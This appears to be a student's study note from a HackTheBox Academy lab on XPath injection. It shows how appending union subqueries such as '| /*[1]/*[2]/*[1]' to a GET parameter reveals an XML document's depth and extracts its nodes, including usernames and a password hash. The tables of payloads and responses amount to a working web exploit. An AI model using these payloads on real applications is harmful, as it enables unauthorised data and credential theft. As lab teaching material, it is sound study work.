# XPath - Advanced Data Exfiltration

# **Advanced Data Exfiltration**

- If we are not allowed to dump the entire XML document we need to first determine the schema depth
- We can do this by making the original XPath query return no results and appending a new query that gives us the information about the depth `| /*[1]`
    
    ```python
    /a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | /*[1]
    ```
    
- The subquery `/*[1]` starts at the document root `/`, moves one node down the node tree due to the wildcard `*`, and selects the first child due to the predicate `[1]`
- The web application expects a `string` but receives an `array` and is thus unable to print the results, resulting in an empty response
    
    ![Untitled](XPath%20-%20Advanced%20Data%20Exfiltration/Untitled.png)
    

| **Value of the `f` GET parameter** | **Response** |
| --- | --- |
| `fullstreetname | /*[1]` | Nothing |
| `fullstreetname | /*[1]/*[1]` | Nothing |
| `fullstreetname | /*[1]/*[1]/*[1]` | Nothing |
| `fullstreetname | /*[1]/*[1]/*[1]/*[1]` | `01ST ST` |
| `fullstreetname | /*[1]/*[1]/*[1]/*[1]/*[1]` | `No Results!` |
- This shows us that the depth must be `4`
- We can then exfiltrate the data by increasing the position until no more data can be retreived

| `fullstreetname | /*[1]/*[1]/*[1]/*[1]` | `01ST ST` |
| --- | --- |
| `fullstreetname | /*[1]/*[1]/*[1]/*[2]` | `01ST` |
| `fullstreetname | /*[1]/*[1]/*[1]/*[3]` | `ST` |
| `fullstreetname | /*[1]/*[1]/*[1]/*[4]` | `No Results!` |
- We can now fill in some of the XML structure we know, but we still dont know the exact names
    
    ```xml
    <a>
    	<b>
    		<street>
    			<fullstreetname>01ST ST</fullstreetname>
    			<streetname>01ST</streetname>
    			<street_type>ST</street_type>
    		</street>
    	</b>
    </a>
    ```
    
- Extract more street data
    
    ```xml
    fullstreetname | /*[1]/*[1]/*[2]/*[1]	02ND AVE
    fullstreetname | /*[1]/*[1]/*[2]/*[2]	02ND
    fullstreetname | /*[1]/*[1]/*[2]/*[3]	AVE
    fullstreetname | /*[1]/*[1]/*[2]/*[4]	No Results!
    ```
    

## Dumping more data

- Example XML file
    
    ```xml
    <dataset>                         <!-- START [1] -->
    	
    	<streets>                       <!-- START First data set [1][1] -->
    		<street>
    			<fullstreetname>01ST ST</fullstreetname>
    			<streetname>01ST</streetname>
    			<street_type>ST</street_type>
    		</street>
    	</streets>                      <!-- END First data set [1][1] -->
    	
    	<users>                         <!-- START Second data set [1][2] -->
    		<group name="users">          <!-- [1][2][1] -->
    			<user>                      <!-- [1][2][1][1] -->
    				<username>test</username> <!-- [1][2][1][1][1] -->
    				<password>test</password> <!-- [1][2][1][1][2] -->
    			</user>
    		</group>
    		<group name="admins">
    			<user>
    				<username>admin</username>
    				<password>admin</password>
    			</user>
    		</group>
    	</users>                        <!-- ENDSecond data set [1][2] -->
    	
    </dataset>                        <!-- END [1] -->
    ```
    
- `street` has depth 3 while `user` has depth 4  `/dataset/users/group/user` and username a depth of 5
- We have to determine the depth again using the following values

| **Value of the `f` GET parameter** | **Response** |
| --- | --- |
| `fullstreetname | /*[1]/*[2]` | Nothing |
| `fullstreetname | /*[1]/*[2]/*[1]` | Nothing |
| `fullstreetname | /*[1]/*[2]/*[1]/*[1]` | Nothing |
| `fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[1]` | `htb-stdnt` |
| `fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[1]/*[1]` | `No Results!` |

| **Value of the `f` GET parameter** | **Response** |
| --- | --- |
| `fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[1]` | `htb-stdnt` |
| `fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[2]` | `295362c2618a05ba3899904a6a3f5bc0` |
| `fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[3]` | `HackTheBox Academy Student Account` |
| `fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[4]` | `No Results!` |

<aside>
ℹ️ **Note:** To exfiltrate an entire XML document, it makes sense to implement a simple script that does the exfiltration for us.

</aside>